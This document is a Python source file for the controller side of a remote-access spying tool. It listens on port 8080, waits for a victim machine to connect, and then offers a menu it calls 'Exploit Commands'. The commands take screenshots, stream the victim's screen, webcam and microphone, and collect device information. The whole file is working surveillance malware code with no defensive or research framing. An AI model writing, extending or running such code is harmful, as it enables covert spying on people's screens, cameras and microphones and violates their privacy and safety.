#!/usr/bin/env python3
import socket 
import sys
import platform
import webStreamer
import screenViewer

host = socket.gethostbyname("") 
port = 8080
sock = None
conn = None

def create_server():
    try:
        global sock
        sock = socket.socket()
        print("Server started on " + host)
    except socket.error as msg:
        print("Socket error: " + str(msg))

def bind_socket():
    try:
        print("Binding the Port " + str(port)) 
        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print("Binding error: " + str(msg))

def socket_accept():
    global conn

    try:
        print("Waiting for a client... (Press 'Ctrl+c' to cancel)")
        conn, addr = sock.accept()

        print("\nConnection has been established | " + " IP " + addr[0] + " | Port " + str(addr[1]))
        print("WARNING: Type '--help' for usage information.\n")
    except KeyboardInterrupt:
        print("\nExit.")
        sock.close()
        sys.exit()
        pass

def show_usage():
    print("\n### Exploit Commands ###\n")
    print("[S] Take a screenshot")
    print("[R] Show screen recording")
    print("[W] View webcam")
    print("[M] Listem mic")
    print("[D] See device information")
    print("[Q] Quit script\n")

def isCompatible():
    #microphone streaming works only on Windows (Linux not tested yet.)
    client_OS = conn.recv(1024).decode()  

    if client_OS == "Darwin":
        print("Client is running OS X. - Microphone stream doesn't work.")
    else:
        my_OS = platform.system()
        conn.send(my_OS.encode())

        if my_OS != "Darwin":
            return True

    return False

def deviceSpecs(verbose):    
    #operating system and some minimal kernel inforrmation
    os = conn.recv(1024).decode()    
    conn.send("OK".encode())

    #display
    width = int(conn.recv(1024).decode())
    conn.send("OK".encode())
    height = int(conn.recv(1024).decode())
    conn.send("OK".encode())
    
    if verbose == True:
        #show information
        print("\n###", '\033[93m' + '\033[1m' + "System information" + '\033[0m', "###\n")
        print('\033[92m' + '\033[1m' + "OS: " + '\033[0m', os)
        print('\033[92m' + '\033[1m' + "Resolution: " + '\033[0m', str(width) + "x" + str(height) + "\n")

    return width, height
        
def send_commands():
    try:
        while True:  
            cmd = input("$ ")
            
            if cmd == "--help" or cmd == "h":
                show_usage()
            elif cmd == "S" or cmd == "s":
                conn.send(cmd.encode())

                W, H = deviceSpecs(False)
                screenViewer.Screenshot(conn, W, H).download_screenshot()
            elif cmd == "R" or cmd == "r":
                conn.send(cmd.encode())
                
                W, H = deviceSpecs(False)
                screenViewer.ShareScreen(conn, W, H).receiveScreen()
            elif cmd == "W" or cmd == "w":
                conn.send(cmd.encode())
                webStreamer.VideoStreamer(conn).receiveVideo()
            elif cmd == "M" or cmd == "m":
                conn.send(cmd.encode())
                
                # this part works only on Windows and Linux (need to check and stop if OS X is used)
                if isCompatible():   
                    webStreamer.MicStreamer(conn).receiveMic()
            elif cmd == "D" or cmd == "d":
                conn.send(cmd.encode())
                deviceSpecs(True)
            elif cmd == "Q" or cmd == "q":
                sock.close()
                conn.close()
                sys.exit()
            else:
                print("Unknown command. Try Again!")
    except KeyboardInterrupt:		
        print("\n\nPress [Q] to quit exploit!\n")
        send_commands()

        pass

if __name__ == '__main__':
    create_server()
    bind_socket()
    socket_accept()    
    send_commands()
